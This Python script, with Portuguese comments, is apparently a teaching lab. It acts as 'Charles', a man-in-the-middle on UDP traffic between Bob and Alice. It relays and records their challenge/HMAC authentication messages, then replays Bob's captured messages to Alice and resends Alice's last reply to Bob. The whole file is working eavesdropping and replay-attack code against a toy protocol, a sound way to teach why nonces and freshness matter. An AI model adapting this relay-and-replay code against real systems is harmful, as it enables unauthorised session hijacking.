#somente verificar se está funcionando

import socket
import MyHashLib as HL

print('ESTA TELA PERTENCE A CHARLES')

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(HL.CHARLES)

cliente = []
servidor = []

bob = None
alice = None

def EavesDropping():
    global alice, bob

    while True:   
        data, addr = s.recvfrom(1024) 
        msg = HL.separaMensagem(data)

        if msg[0] == 'HELLO':
            bob = addr
            print(f'Descobri o Endereço de Bob {bob}')
        elif msg[0] == 'CHALLENGE':
            alice = addr
            print(f'Descobri o Endereço de Alice {alice}')


        if addr == bob: 
            print('ESCUTEI BOB: ', msg)
            cliente.append(data)  
            # repassa a mensagem para ALICE
            s.sendto(data, HL.ALICE)
        else:
            print('ESCUTEI ALICE: ', msg)
            servidor.append(data)
            # repassa a mensagem para BOB
            s.sendto(data, bob)

        if msg[0] == 'HMAC':
            break

        

def ReplayAttack():

    print('Fazendo REPLAY ATTACK contra ALICE')
    for m in cliente:
        s.sendto(m, alice)
        print('Enviei: ', m)
        data, _ = s.recvfrom(1024)
        msg = HL.separaMensagem(data)
        print('Recebi: ', msg)

    try:
        s.settimeout(5)
        print('Aguardando a mensagem: ')
        data, _ = s.recvfrom(1024)
        msg = HL.separaMensagem(data)
        print('Recebi: ', msg)
    except:
        print('A autenticação falhou')
    finally:
        s.settimeout(None)
        print('Tentando enviar uma mensagem duplicada para BOB ...')
        print(servidor[-1])
        for i in range(3):
            s.sendto(servidor[-1], bob)
    

while True:
    print('Iniciando escuta ...')
    EavesDropping()
    input('Digite <ENTER> para fazer o REPLAY ATTACK')
    ReplayAttack()







